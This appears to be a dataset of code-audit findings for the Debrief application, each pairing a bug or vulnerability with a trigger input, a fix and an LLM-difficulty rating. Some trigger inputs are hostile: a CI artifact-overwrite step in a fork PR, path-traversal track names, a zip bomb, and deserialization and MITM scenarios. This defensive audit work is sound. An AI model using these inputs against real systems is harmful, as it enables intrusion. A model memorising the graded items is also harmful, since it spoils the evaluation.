description: importThis creates new SimpleDateFormat('MMMyy') with the platform default locale (also default time zone). Verified: with Locale.GERMANY 'MAR20' and 'OCT20' throw ParseException. processUnit then only appends an error and leaves status.year/month at 0, and parseTimestamp (L362-366) builds every subsequent timestamp from year 0 / month 0, so all fixes, contacts and narratives get bogus dates while the import 'succeeds'. Separately, timestamps carry day-of-month only, so a report spanning a month boundary rolls back a month (L365).
trigger_input: NISIDA file starting 'UNIT/ADRI/OCT20/...' opened on a JVM with a German or French default locale
suggested_fix: Use new SimpleDateFormat('MMMyy', Locale.ENGLISH) with GMT time zone, and abort (or refuse to create fixes) when the UNIT date failed to parse.
llm_value: Locale-default SimpleDateFormat is grep-able, but the year-0 silent consequence needs the state flow.

title: Exported ;NARRATIVE: lines omit the track name (return value of exportTrackNa...
description: exportThis calls ImportFix.exportTrackName(theEntry.getTrackName(), line) but ignores its return value, so the written line is ';NARRATIVE: <dtg> <entry text>' with no track column. On re-import readThisLine (L289-292) consumes the first word of the entry text as the track name, so every exported narrative loses its source track and the first word of its text. ImportNarrative2 (L358) does it correctly.
trigger_input: Export a narrative layer to REP (clipboard) and re-import: entry 'Contact regained' on track NELSON becomes track 'Contact' with text 'regained'
suggested_fix: Assign the result: line = ImportFix.exportTrackName(theEntry.getTrackName(), line);
llm_value: Discarded-return-value on a String-building helper; CodeQL might flag unused return value, but the data-loss consequence needs the reader side.

title: Malformed REP lines are silently dropped: line importers return null, readLin...
description: Most per-line importers catch ParseException, write to Trace and return null (ImportFix L881-884, ImportSensor L350-353, ImportSensor2 L338-341, ImportTMA_Pos L371-374, ImportTMA_RngBrg L341-344, ImportCircle L237-240, ImportRectangle L298-301, ImportLabel L233-236, ImportPolygon L540-543, ImportWheel L249-252, ImportBearing L263-266). ImportReplay.readLine then falls through every instanceof branch for a null object and returns null, so a fix/sensor/TMA line with an unparseable numeric field vanishes from the imported track with no dialog, no line number and no count; the user sees a track with silently missing fixes. Only NumberFormat/NoSuchElement/Parse exceptions that escape the line importer reach the readError dialog (L1618-L1630), giving inconsistent behaviour between fields (e.g. speed uses Double.valueOf and aborts, latitude uses readThisDouble and is dropped).
trigger_input: REP file with one fix line whose latitude seconds field is 'x' among 1000 good lines: import completes, one fix missing, no error shown
suggested_fix: Make readLine treat a null result from a recognised importer as an error: count it and surface the line number via readError/handleException (or collect a summary of skipped lines shown at end of import).
llm_value: Needs tracing the null-return contract across ~12 importer classes and the readLine dispatch; grep finds 'return null' but not that the caller drops it silently.

title: AISParser.parse returns raw null for out-of-sequence multipart fragment, NPE ...
description: parse() returns Optional<IAISMessage> everywhere except L228, where an out-of-order or orphan multi-sentence fragment returns bare null. ImportAIS.importThis calls oRes.isPresent() on the result (ImportAIS L305-306) and throws NullPointerException, aborting the whole import. AIS logs very commonly start mid-message or drop fragments, so this is triggered by ordinary capture files.
trigger_input: AIS log whose first line is a second fragment, e.g. '!AIVDM,2,2,3,B,88888888880,2*25' (valid checksum) followed by normal position reports
suggested_fix: Return Optional.empty() at L228 and log the discarded fragment with the line number.
llm_value: grep-able (return null in Optional-returning method), but the crash needs the caller's isPresent() call to be linked.

title: Resample replaces all original fixes and Undo leaves the track empty
description: execute() resamples from start+interval to <end (so the original first and last fixes are never regenerated), then clearPositions() discards every original fix and adds only the interpolated ones; original positions are never remembered. undo() removes only the interpolated fixes and sets _newFixes to null, so after Undo the track has no positions at all, and a second undo would NPE on _newFixes.
trigger_input: Outline right-click on any TrackWrapper -> Resample position data -> 1 Min, then Edit -> Undo
suggested_fix: Snapshot the original FixWrapper collection (per segment) before clearPositions() and restore it in undo(); also keep the original start/end fixes or extend the loop to <= endTime.
llm_value: Needs reasoning about what undo must restore versus what execute discarded; not a pattern a linter flags.

title: Undo of split throws IndexOutOfBounds when any selected track had no jumps
description: execute() stores newSegments for every track including empty lists (L92-L94, L190-L192). undo() takes splits.get(0) as the merge target without checking emptiness, so an empty list throws IndexOutOfBoundsException and the remaining tracks are never restored; the undo operation is left half-applied in the history.
trigger_input: Select two tracks, one with a >1 minute gap and one continuous; Split tracks into segments on gaps over 1 Minute; then Undo
suggested_fix: Skip tracks whose split list is empty (or do not store them) in both SplitTracksOperation.undo and SpatialSplitTracksOperation.undo.
llm_value: Requires connecting execute's storage of empty lists to undo's unconditional get(0).

title: pr-meta validation lets a fork PR steer the write-token comment onto any PR
description: Real type: insufficient validation of untrusted workflow_run artifact. The job runs with `pull-requests: write` (L24) and reads pr-meta/meta.env (L69-77), which is produced in main.yml AFTER `mvn clean verify` executed the fork's poms on the same runner (main.yml L174-179 then L282-290), so every byte of it is attacker-controlled. The only guard on `pr` is `Number.isInteger(prNumber) && prNumber > 0` (L79-83); nothing ties it to the run (`github.event.workflow_run`). The sticky-comment logic (L177-187) then updates the existing github-actions[bot] comment containing MARKER on that issue, so an attacker replaces a legitimate PR's 'Review builds' comment with links to binaries built from their own fork. `meta.build` (L91-96) is equally untrusted, so a failed build can be presented as `success`.
trigger_input:
Fork PR whose pom.xml antrun execution runs `printf 'pr=123
sha=<40hex>
build=success
' > $GITHUB_WORKSPACE/pr-meta/meta.env` after the real step, or simply replaces /usr/bin/bash via passwordless sudo; the comment on PR #123 is rewritten to point at the attacker's Windows zip.
suggested_fix: Do not trust `pr` from the artifact: resolve the PR via `github.rest.pulls.list({head: run.head_repository.full_name+':'+run.head_branch})` (or `repos.listPullRequestsAssociatedWithCommit(run.head_sha)`) and require `pull.head.sha === run.head_sha`; derive `built` from `run.conclusion`, not meta.build.
llm_value: Requires following the data flow from the untrusted build step through the artifact into the privileged workflow and noticing the integer check does not bind the number to the run; no grep/CodeQL rule expresses this.

title: Release job downloads msitools over plain http and runs sudo make install
description: L3 fetches http://ftp.gnome.org/pub/GNOME/sources/msitools/0.100/msitools-0.100.tar.xz with no TLS and no checksum/signature check, L5 compiles it and installs as root. It runs only in main.yml's `build installer` step (L196-215) on tag builds, i.e. on the very runner that holds the `contents: write` GITHUB_TOKEN (L88-89) and later uploads the release (L310-324). A network MITM of the cleartext fetch gets root on the release runner and can replace every release asset. ftp.gnome.org is also decommissioned (redirects to download.gnome.org), so the fetch depends on a redirect from an unauthenticated origin.
trigger_input: Push a release-shaped tag while an on-path attacker answers the http GET for msitools-0.100.tar.xz with a tarball whose Makefile installs a trojaned wixl.
suggested_fix: Use https://download.gnome.org/... , pin the tarball SHA-256 and check it with sha256sum -c before extracting, or install the distro `msitools`/`wixl` package (available in Ubuntu 24.04) instead of compiling.
llm_value: grep-able for http://, but ranking it needed the workflow read to see it runs on the release runner with the write token.

title: Shared static SimpleDateFormat/DecimalFormat instances used without synchroni...
description: _XMLDateFormat and RNdateFormat are lazily created static SimpleDateFormats (creation is synchronized but use is not): HandleDateTimeAttribute.setValue() calls getXMLDateFormatter().parse() and writeThis(Date)/writeThisInXML() call format() concurrently. DebriefFormatDateTime.toString() likewise uses static _df/_dfMillis unsynchronised (only parseThis is synchronized). Eclipse loads dropped files in parallel Jobs and autosave can run while an import is in progress, and SimpleDateFormat corrupts results silently under concurrent use.
trigger_input: Drag two .dpf files onto an open plot simultaneously, or save while a large import is running
suggested_fix: Use java.time DateTimeFormatter (immutable) or ThreadLocal formatters; same for DebriefFormatDateTime._df/_dfMillis and MWCXMLReader shortFormat/longFormat.
llm_value: Needs knowledge that SimpleDateFormat is not thread-safe plus the concurrent-job context; a grep finds the statics but not the unsynchronised use sites.

title: DTG round-trips through a two-digit-year format
description: writeThis(HiResDate) delegates to DebriefFormatDateTime.toStringHiRes(), which formats with 'yyMMdd HHmmss'; parseThis() reads it back with the same two-digit pattern, so SimpleDateFormat's sliding 80/20 window decides the century. Any dataset dated before ~1946 or after ~2046 (historical reconstructions, far-future exercise dates) is silently shifted by 100 years on save/load, and the shift point moves every year the software is run.
trigger_input: Save a plot containing a fix dated 1940-05-26 and reopen it: the fix loads as 2040-05-26
suggested_fix: Write a four-digit year (yyyyMMdd) on export; parseThis already accepts it (spaceIndex > 6 branch).
llm_value: Required tracing writeThis(HiResDate) into DebriefFormatDateTime and knowing SimpleDateFormat's yy window semantics.

title: Custom colour components unvalidated; out-of-range or non-numeric values abor...
description: handleOurselves() parses CustomRed/Green/Blue with Integer.valueOf outside any try/catch, and elementClosed() calls new Color(_r,_g,_b), which throws IllegalArgumentException for values outside 0-255; either exception propagates out of the SAX callbacks and fails the whole file. _setColour compares against 'CUSTOM' while exportColour writes 'custom', so that branch is dead. fromString() has the same unguarded parseInt.
trigger_input: <colour Value="custom" CustomRed="300" CustomGreen="0" CustomBlue="0"/> in a track element
suggested_fix: Clamp/validate components, catch NumberFormatException and fall back to a default colour with a warning.
llm_value: grep-able for the parses; the Color range check needs API knowledge.

title: Missing Units attribute causes NPE; unknown units silently become microseconds
description: elementClosed() calls Duration.getUnitIndexFor(_units) where _units is null when the Units attribute is absent, throwing NPE (rethrown by MWCXMLReader.endElement and aborting the import). When Units is present but not one of the exact labels, getUnitIndexFor returns 0 (micros), so 'Hours' or 'hrs' silently loads a 2-hour duration as 2 microseconds. WorldSpeedHandler/BaseDataHandler have the identical pattern (index 0 = m/s).
trigger_input: <Duration Value="2" Units="Hours"/> in a .dpf planning segment, or <Duration Value="2"/>
suggested_fix: Default _units sensibly or reject the element; make unit lookup case-insensitive and fail on unknown labels.
llm_value: Needs following the null into getUnitIndexFor and understanding the 0-index default.

title: longLocation attributes parsed with unguarded valueOf/charAt and lossy minute...
description: Integer.valueOf/Float.valueOf/charAt(0) are called directly on attribute text with no try/catch and outside the base-class guard (handleOurselves is overridden), so a malformed or empty value throws NumberFormatException/StringIndexOutOfBounds through the SAX parser and aborts the whole import. In elementClosed() fractional minutes are only converted to seconds when _latSec == 0 (float equality), and the constructor is then given (int)_latMin, so 'LatMin=30.5 LatSec=10' silently drops the half minute.
trigger_input: <longLocation LatDeg="50" LatMin="30.5" LatSec="10" LatHem="" .../>
suggested_fix: Wrap parsing in try/catch with a clear error, validate hemisphere length, and always add the fractional minutes to the seconds.
llm_value: Needs reasoning about the float-equality branch and the (int) truncation together.

title: extractWorldDistance parses a double attribute with Integer.parseInt; unknown...
description: exportDistance() writes Value with writeThisLong ('0.0000000'), but the DOM helper extractWorldDistance() reads it with Integer.parseInt, so every exported value throws NumberFormatException (used by ASSET LocationOffset). In the SAX path an unrecognised Units label is passed to WorldDistance.getUnitIndexFor(), which returns 0 (metres) for anything it does not recognise, so e.g. 'NM' or 'nmi' silently loads a nautical-mile distance as metres; a missing Value leaves -1.
trigger_input: Monte-Carlo template with <LocationOffset><WorldDistance Value="1.0000000" Units="nm"/></LocationOffset>, or a hand-edited .dpf using Units="NM"
suggested_fix: Parse with readThisDouble; make getUnitIndexFor return -1/throw for unknown labels and treat that as an import error.
llm_value: Needs cross-checking the export format against the import parse and the semantics of getUnitIndexFor.

title: Save errors are logged but not reported; partially written .dpf looks like a ...
description: exportThis()/outputContent() catch DOMException, ParserConfigurationException and TransformerException, log them and return normally. The Transformer may already have written part of the document to the OutputStream, so the plot file on disk is truncated/invalid while the caller (PlotEditor save) receives no exception and cannot mark the editor dirty or warn the user. The same pattern exists in the legacy DebriefXMLReaderWriter.
trigger_input: Export of a layer whose exporter throws DOMException (e.g. an attribute value containing an illegal XML character), or a disk-full TransformerException mid-write
suggested_fix: Rethrow as an unchecked/IO exception so the save operation fails visibly, and write to a temp file then rename.
llm_value: Needs reasoning about partial output already flushed to the stream before the catch.

title: KML bytes decoded with platform default charset, ignoring the XML encoding de...
description: inputStreamAsString() wraps the stream in InputStreamReader with no charset, so a UTF-8 KML (the KML standard) is decoded as cp1252 on Windows before being handed to the parser as a String; non-ASCII track names are corrupted and a UTF-8 BOM/degree sign may then be stripped by stripNonValidXMLCharacters. Track names for LineString data come from Date.toString() (default locale and timezone).
trigger_input: UTF-8 KML with <name>Frégate-1</name> opened on a Windows machine with cp1252 default
suggested_fix: Pass the InputStream (or a byte array) directly to DocumentBuilder.parse so the parser honours the encoding declaration; if pre-filtering is required, decode as UTF-8 explicitly.
llm_value: Needs knowing XML encoding detection is bypassed once the bytes are turned into a String.

title: Import failures only printStackTrace; static mutable state shared across imports
description: All caught exceptions (parser config, SAX, IO, ParseException) go to printStackTrace, so a malformed KML results in an empty or partial import with no user-visible message. lastLayer/colorCounter are static mutable fields written during import (and lastLayer is only cleared on the normal path), so two concurrent KML loads can append fixes to each other's tracks. LineString points are assigned fabricated timestamps at 1-second steps (DEFAULT_TIME_STEP) with nothing marking them as synthetic. || doZipImport() catches IOException (truncated/corrupt zip, wrong password, CRC error) and only printStackTrace()s; the loader completes as if successful and the plot is left unchanged with no user-visible message. The ZipInputStream is also never closed.
trigger_input: Truncated .kml file dropped onto a plot: nothing appears and no dialog is shown
suggested_fix: Propagate a PlainImporter.ImportException so the loader shows the standard error dialog; make lastLayer/colorCounter locals or instance fields.
llm_value: grep-able

title: Fix with unparseable/missing Dtg or centre is added and crashes the import
description: The Dtg handler catches ParseException and leaves _theFix.time null (parseThis also returns null for the NULL date string); elementClosed() still calls addPlottable(), and TrackSegment.addFixSilent -> FixWrapperCollisionCheck.correctTimeCollision dereferences getTime().getMicros(), so one bad fix aborts the whole plot with 'Parse Error: null'. A fix without a centre element likewise NPEs in TrackWrapper.addFix when extending _myWorldArea. Course wrap at L141-L144 also only adds 360 once.
trigger_input: <fix Dtg="garbage" Course="0" Speed="0"><centre><shortLocation Lat="1" Long="1" Depth="0"/></centre></fix>
suggested_fix: In elementClosed() skip (and report) fixes whose time or location is null rather than adding them.
llm_value: Needed to trace the null across FixHandler, TrackSegment and FixWrapperCollisionCheck.

title: Index and value lists desynchronise when one measurement attribute fails to p...
description: Each Item element appends Index to _indices and Value to _values independently; Long.parseLong/Double.parseDouble exceptions are swallowed by MWCXMLReader.handleOurselves, so a single bad Value leaves _indices one longer than _values and every subsequent measurement is silently attributed to the wrong time. TimeSeries2DoubleHandler has the same structure with two value lists.
trigger_input: <Item Index="1000" Value="n/a"/> followed by valid items in a MeasuredData dataset
suggested_fix: Parse both attributes into locals in handleOurselves and add the pair atomically (or skip the item) when both parse.
llm_value: Requires understanding the swallowing in the base class combined with two parallel lists.

title: Output filename built from unsanitised primary track name
description: Same pattern as ExportToFlatFile: fileName = filePath + separator + primaryTrack.getName() + '_' + HOST_DATE + suffix, with the document-supplied track name unsanitised, allowing writes outside the chosen directory and silent failure on illegal characters. || fileName = filePath + separator + primaryTrack.getName() + '_' + date + '.csv'. The track name comes from the loaded .rep/.dpf and may contain path separators or '..', so the export writes outside the directory the analyst chose; filePath is also left null when the wizard page is incomplete, producing a relative 'null/...' path. ExportToFlatFile L208-L211 has the same construction.
trigger_input: Track named '../evil' selected as primary when exporting Doppler shift.
suggested_fix: Share one sanitise-and-confine helper with ExportToFlatFile.
llm_value: grep-able

title: Output filename built from unsanitised primary track name
description: The SAM flat-file export writes to filePath + separator + primaryTrack.getName() + '_' + date. The track name comes from the loaded data file (.rep/.dpf) and is not sanitised, so a name containing path separators or '..' writes outside the folder the user chose (path traversal on save), and names with characters illegal on Windows (':' '?' '*') make the export fail with only a log entry after a success-looking wizard.
trigger_input: Load a .rep whose track name is '..\..\Startup\x' (quoted token) and run Export to flat file.
suggested_fix: Sanitise the name (replace [^A-Za-z0-9._-]) and verify the resulting File's canonical parent equals the chosen folder before writing.
llm_value: grep-able once you know track names are document-controlled; needed the data-flow to rate it.

title: zip4j 1.3.2, pdfbox 2.0.3 and jsoup 1.11.3 bundled with known DoS/Zip-Slip fi...
description: libs/zip4j-1.3.2.jar predates the Zip Slip path-traversal fix (1.3.3, 2018) and is used to extract user-chosen pptx templates. libs/pdfbox-2.0.3.jar is fed untrusted PDFs by PdfLoader/ImportNarrativeDocument.importFromPdf and lacks fixes for CVE-2018-11797 (page-tree DoS, 2.0.12), CVE-2019-0228 (XXE in XMP, 2.0.15), CVE-2021-27807/27906 and CVE-2021-31811/31812 (infinite loops/OOM, 2.0.23-2.0.24). libs/jsoup-1.11.3.jar lacks the CVE-2021-37714 infinite-loop fix (1.14.2) and parses template XML.
trigger_input: Crafted PDF opened via the PDF narrative loader; crafted pptx template.
suggested_fix: Bump pdfbox to 2.0.30+, jsoup to 1.15+, zip4j to 2.11+ (adapt UnpackFunction/PackPresentation to the 2.x API).
llm_value: grep-able

title: process.waitFor() called before draining gdal stdout/stderr (pipe deadlock)
description: createBackgroundFile() and generatePDF() call runtime.exec() then process.waitFor() and only afterwards read stdout and stderr. If gdalwarp/gdal_create writes more than the OS pipe buffer (typically 64 KB on Windows, e.g. verbose warnings for a large or malformed GeoTIFF background) the child blocks on write, waitFor() never returns and the GeoPDF export hangs the UI thread indefinitely. || generatePDF calls runtime.exec(...) then process.waitFor() at L576 and only afterwards opens and drains stdout and stderr (L577-L595). If gdal_create emits more than the pipe buffer (typically 64 KB) of warnings, the child blocks on write and waitFor never returns, hanging the export. In addition any non-empty stdout is treated as an error (L588-L590), so informational output aborts the export.
trigger_input: GeoPDF export with a background raster that makes gdalwarp emit many warnings (or with CPL_DEBUG set).
suggested_fix: Use ProcessBuilder.redirectErrorStream(true) and consume the output stream in a loop (or a thread) before/while waiting; add a timeout.
llm_value: Requires knowing the Process pipe-buffer semantics; not a grep pattern.

title: handleImportX swallows XWPFDocument open failure then dereferences null doc
description: handleImportX() catches IOException from new XWPFDocument(inputStream) (L1123-L1126) and continues to doc.getTables() (L1129) with doc==null, throwing NPE. Non-IOException failures (POIXMLException/NotOfficeXmlFileException for a .docx that is really OLE2 or not a zip) are not caught at all. Either way the user sees a generic 'Problem loading' log entry and no explanation.
trigger_input: Rename a .doc (OLE2) or a text file to .docx and open it; or a truncated .docx.
suggested_fix: Return early (with a logged, user-visible message) when doc==null and catch POI runtime exceptions around the constructor; mirror the .doc-in-.docx fallback that handleImport has for the opposite case.
llm_value: grep-able

title: Word documents and fallback FileInputStream never closed
description: handleImport() never closes the HWPFDocument (L1086), and on the .docx-in-.doc fallback opens a second FileInputStream is2 (L1091) that is never closed; handleImportX() never closes the XWPFDocument in the rider branch (L1123/L1132-L1134) - only ImportNarrativeDocument.importFromWordX() closes it in the other branch. XWPFDocument holds an open ZipFile on the source, so the imported file stays locked on Windows for the workbench lifetime and handles leak per import.
trigger_input: Import a rider narrative .docx then try to overwrite or delete it in Explorer while Debrief is running.
suggested_fix: Use try-with-resources for the documents and is2; close in finally.
llm_value: grep-able

title: Slide XML read/written with platform default charset (charset mismatch)
description: Slide and presentation XML are decoded with new String(bytes) (default charset) and written back with FileWriter (default charset) although the parts are UTF-8. On Windows (cp1252 default in Java 11) template bytes undefined in cp1252 (0x81,0x8D,0x8F,0x90,0x9D) become U+FFFD and any non-ASCII narrative text or track name is emitted as cp1252 bytes inside a UTF-8 declared part, producing a PPTX PowerPoint flags as corrupt/repairable or with mojibake.
instances: L241; L807; L825; L850-L852; ParsePresentation.java L31; FindMap.java L51
trigger_input: Export on Windows with a narrative entry containing 'é' or '°', or a template whose slide XML contains curly quotes.
suggested_fix: Use new String(bytes, StandardCharsets.UTF_8) and Files.newBufferedWriter(path, UTF_8) (or Jsoup's charset-aware output).
llm_value: Needed to connect the read and write sides and the OOXML UTF-8 contract; a lint would flag default-charset use but not the resulting file corruption.

title: Export with zero recorded tracks throws IndexOutOfBounds out of the export path
description: createTimeNarrativeShapes() does trackData.getTracks().get(0) (L542) and the per-track loop does coordinates.get(0) (L395). CoreCoordinateRecorder.exportFile() catches only IOException/ZipException/DebriefException, so a recording session where no track was visible ends in an uncaught RuntimeException from stopStepping() after the user completed the dialog.
trigger_input: Start PPTX recording with all tracks hidden (or a plot with only shapes), step the time, stop and confirm the export dialog.
suggested_fix: Validate trackData (at least one track with at least one point) before unpacking, and report via DebriefException.
llm_value: grep-able

title: validateDonorFile/export do not guard against templates missing expected shapes
description: validateDonorFile catches DebriefException/IOException/ZipException only, but the checks it runs throw unchecked exceptions first: FindMap.getSlides() NPEs when ppt/slides is absent (listFiles()==null), FindMap.checkForMap() and getMapDimesions() IOOBE/NumberFormatException when the 'map' shape lacks a|off/a|ext, findTimeAnimationObjects() NPEs when no p|spTgt targets the 'time' shape (time_anim_tag_big null at L672), findAnimationTagObjects() NPEs without p|animMotion. retrieveMapProperties() NPEs at L756 when no map shape exists. These escape into the SWT dialog (okPressed) and the preference page.
trigger_input: A pptx with one slide but no shape named 'map', or without any animation timing, chosen as master template.
suggested_fix: Catch RuntimeException in validateDonorFile and return a message; null-check every selectFirst/get(0) result and convert to DebriefException.
llm_value: Needed reading of the parent().parent() chains and the catch list to see which failures escape.

title: extractAll of template has no size or entry-count limit
description: The whole archive is inflated to disk with no check on uncompressed size, entry count or compression ratio. A small pptx with a multi-GB zero-filled slide part fills the temp volume and stalls the export/validation. validateDonorFile is invoked synchronously in the UI thread from ExportPPTDialog.okPressed().
trigger_input: A 100 KB .pptx whose ppt/media/x.bin inflates to tens of GB (deflate ratio ~1000:1), set as master template.
suggested_fix: Iterate file headers, sum getUncompressedSize(), refuse archives over a fixed budget (e.g. 200 MB) or with more than a few thousand entries before extracting.
llm_value: grep-able (extractAll without bounds) but impact needed the call-site/UI-thread context.

title: XStream 1.4.12 bundled and exported; many RCE/DoS CVEs, no default type allow...
description: org.mwc.cmap.core ships and exports com.thoughtworks.xstream 1.4.12 (MANIFEST.MF L8, L52-L67). Versions before 1.4.18 have no default security framework and 1.4.12 is affected by CVE-2020-26217 (RCE), CVE-2020-26258 (SSRF), CVE-2020-26259 (file deletion), CVE-2021-21341..21351 and CVE-2021-29505 (RCE/DoS), CVE-2021-39139..39154 and CVE-2022-41966 (DoS). The only consumer (XYPlotView.restorePreviousPlot) deserializes strings from the workbench memento with fromXML and no allowlist. || xstream-1.4.12 is affected by 33 OSV advisories including remote code execution via crafted XML (CVE-2020-26217, CVE-2021-21344..21351, CVE-2021-29505, CVE-2021-39139..39154, CVE-2022-41966, CVE-2024-47072). XYPlotView.restorePreviousPlot creates new XStream(new DomDriver()) at L1112 with no allowTypes/security framework and calls fromXML on strings taken from the Eclipse view memento (L1119, L1128, L1150-L1174). The memento lives in the workspace .metadata/.plugins/org.eclipse.e4.workbench/workbench.xml, so exploitation requires a poisoned workspace or shared .metadata rather than a data file, which caps severity at Medium.
instances: MANIFEST.MF L8; L52-L67; org.mwc.cmap.core/META-INF/MANIFEST.MF L8; org.mwc.cmap.xyplot/src/org/mwc/cmap/xyplot/views/XYPlotView.java L1112-L1128, L1150-L1174
trigger_input: Any XStream.fromXML on attacker-influenced XML; today that is workbench.xml/memento content in the workspace .metadata folder.
suggested_fix: Upgrade to XStream 1.4.21+ and configure xs.allowTypes/allowTypesByWildcard for the few JFreeChart/Debrief classes needed, or replace the memento serialization with plain strings.
llm_value: grep-able (jar version), but exploitability assessment required locating the single consumer.

title: AWT clipboard Plottable flavor deserialized before checking Transferable origin
description: createMenu asks the AWT clipboard for PlottableSelection.PlottableFlavor (a DataFlavor built from the Plottable class, i.e. application/x-java-serialized-object, PlottableSelection L77) and calls tr.getTransferData at L256 BEFORE the `tr instanceof PlottableSelection` check at L260. For a Transferable proxy coming from another process AWT's DataTransferer reconstructs the object with ObjectInputStream, so foreign clipboard bytes are deserialized on every right-click on a Layer. Debrief Lite's OutlinePanelView does this correctly (instanceof check at L866 before getTransferData L870).
trigger_input: Another process publishes clipboard data under the application/x-java-serialized-object;class=MWC.GUI.Plottable flavor; analyst right-clicks a layer in the legacy Swing outline.
suggested_fix: Move the `tr instanceof PlottableSelection` test before getTransferData (as OutlinePanelView does) so only in-process Transferables are unwrapped.
llm_value: Requires knowing AWT deserializes serialized-object flavors for foreign Transferables and noticing the ordering of the instanceof check.

title: .dpl plot files are loaded via unfiltered Java serialization
description: OpenPlotAction.execute opens the user-selected *.dpl file with a raw ObjectInputStream and calls readObject() (L66-L71) with no ObjectInputFilter; the Session cast happens only after the whole graph has been reconstructed, so any Serializable class reachable from the legacy bundle (and the whole flat classpath in Debrief Lite) is instantiated with attacker data. Reachability caveat: the only reference to OpenPlot outside its own file is a commented-out block in Application.java L503-L508, so this tool is dead code in the shipped RCP/Lite products; it remains a live class that would become Critical if re-wired.
trigger_input: A crafted plot.dpl containing a deeply nested HashSet graph (SerialDOS) or a gadget chain for any bundled library; user chooses File > Open Plot in the legacy Swing app.
suggested_fix: Delete OpenPlot/SavePlotAs and the .dpl format, or add a strict ObjectInputFilter allowlisting Debrief/MWC session classes with depth/size limits.
llm_value: Severity depends on establishing that the code path is unreachable from the RCP product, which required tracing callers.

title: GeoTools 21.2 (2019, EOL) + 100 transitive jars incl. vulnerable h2/hsqldb
description: The whole org.mwc.cmap.geotools/libs tree (gt-*-21.2, gt-swt-23-SNAPSHOT, 34 jt-* JAI-tools jars, JAI 1.1.3 from 2006) is hand-vendored and unmaintained; GeoTools is now on 33.x with Java 17+ and jakarta.* moves, which #5237 must absorb. Bundled transitive jars carry confirmed CVEs even though Debrief code only touches shapefile/geotiff/referencing/render (NaturalearthUtil, NELayer, WorldImageLayer): gt-jdbc-21.2 CVE-2023-25158 (SQL injection via filter encoding), h2-1.4.200 CVE-2021-42392 / CVE-2022-23221 (JNDI RCE via JDBC URL; no Debrief code opens an H2 URL), hsqldb-2.2.8 CVE-2022-41853 (used only by gt-epsg-hsql against the bundled EPSG DB), commons-text-1.6 CVE-2022-42889 (StringSubstitutor not invoked), jdom2-2.0.6 CVE-2021-33813, guava-27.0 CVE-2023-2976, jackson-core-2.9.9 CVE-2025-52999, commons-io-2.6 CVE-2021-29425/CVE-2024-47554. None of these paths is reached by untrusted input today, so this is an outdated-dependency row rather than a vulnerable one.
trigger_input: N/A for current code paths; any future use of gt-jdbc/H2 or shapefile attribute filters from user input would become exploitable.
suggested_fix: Move the plugin to a Tycho pomDependencies=consider / target-platform Maven location so GeoTools and its transitive set are resolved from Maven Central (33.x) and Dependabot can track them; drop gt-jdbc, gt-jdbc-h2, h2 and hsqldb if unused.
llm_value: Needed to check each transitive CVE against actual Debrief usage to avoid a false High.

title: Apache POI 4.1.2 (2020) with CVE-2025-31672 reachable via .doc/.docx import
description: poi-4.1.2, poi-ooxml-4.1.2, poi-ooxml-schemas-4.1.2, poi-scratchpad-4.1.2 and xmlbeans-3.1.0 are on the cmap.legacy Bundle-ClassPath L19-23 and exported to debrief.legacy. OSV lists CVE-2025-31672 (poi-ooxml: inconsistent handling of duplicate [Content_Types].xml entries lets a crafted OOXML file be parsed differently than intended) and CVE-2022-26336 (poi-scratchpad HMEF OOM; HMEF is not used by Debrief). XWPFDocument/HWPFDocument are constructed directly from analyst-selected .docx/.doc via MsDocXLoader/MsDocLoader and ImportASWDataDocument, so the ooxml path is reachable. POI 4.1.2 is also EOL and blocks Java 25 (#5237).
instances: org.mwc.cmap.legacy/META-INF/MANIFEST.MF L19-L23; org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportRiderNarrativeDocument.java L343, L354, L408; org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportASWDataDocument.java L616; org.mwc.debrief.core/plugin.xml L224-L228
trigger_input: A .docx with two conflicting [Content_Types].xml entries opened via File > Open.
suggested_fix: Upgrade to POI 5.4.x (poi, poi-ooxml, poi-ooxml-lite, poi-scratchpad, xmlbeans 5.x, commons-compress 1.27, log4j-api) and remove the duplicate POI 3.14 jars from org.mwc.debrief.legacy.
llm_value: Needed to distinguish the HMEF-only CVE from the reachable OOXML one and to confirm the 3.14 copies are not the ones on the classpath.

title: jsoup 1.11.3 DoS (CVE-2021-37714) parsing XML from user-chosen PPTX template
description: jsoup before 1.14.2 can be driven into an infinite loop / excessive CPU by crafted markup (CVE-2021-37714); 1.11.3 also carries CVE-2022-36033 (XSS via cleaner, not used). ParsePresentation L31 and FindMap L51 call Jsoup.parse(..., Parser.xmlParser()) on slide XML extracted from the analyst-selected PowerPoint template, so a hostile template hangs the export.
trigger_input: A .pptx template whose ppt/slides/slide1.xml contains the CVE-2021-37714 trigger (deeply nested unclosed tags) selected in Preferences and used by Export to PowerPoint.
suggested_fix: Upgrade to org.jsoup:jsoup 1.18.x (API compatible for parse/select).
llm_value: grep-able

title: Target platform pinned to Eclipse 2021-12 / GEF 3.11 (2016), http repos
description: The target pins Eclipse platform 4.22 (releases/2021-12, L45-67), GEF 3.11.0.201606061308 (2016, L62), Orbit R20210223232630 (guava 30.1, gson 2.8.6, protobuf 2.4.0 from 2011, asm 5.0.1, L86-92), Nebula 2.5.0 (L95), EASE 0.8.0 (L70), WTP 3.23 / webtools 2021-03 (L37, L100) and a duplicate 2021-03 release repo (L42). Eclipse 4.22 predates the platform XXE fix CVE-2023-4218 (Eclipse < 4.29 parses project XML without entity restrictions) and four years of SWT/JFace/p2 fixes; three repositories are fetched over http:// (L42, L45, L95). The Java 25 upgrade (#5237) requires Eclipse 2025-09+ anyway.
instances: org.mwc.debrief.targetplatforms/eclipse-latest.target L37, L42, L45, L62, L70, L92, L95, L100, L151
trigger_input: Open a hostile .project/.settings XML in the workspace (CVE-2023-4218); MITM of http:// p2 metadata during a build.
suggested_fix: Regenerate eclipse-latest.tpd against Eclipse 2025-09 (or the release chosen for #5237), latest Orbit/Nebula/EASE, GEF Classic 3.20, and use https:// for every repository.
llm_value: grep-able

title: Global earth model returns one shared mutable WorldLocation from add()
description: add() writes its result into the instance field _workingLocation and returns it. Because a single FlatEarth instance is the process-wide model held in WorldLocation._model, two threads calling WorldLocation.add/addToMe concurrently (e.g. SATC/TMA solver threads, background import while the plot paints) can interleave setLat/setLong/setDepth and the copy made in WorldLocation.add, yielding a location with mixed lat/long from two different calls.
trigger_input: Import a large .dpf on a background job while a plot with relative-projection animation repaints; occasional fixes land at a corrupted position.
suggested_fix: Allocate the result (or accept a caller-supplied result object as subtract(...,res) already does) rather than sharing a field on a globally shared instance.
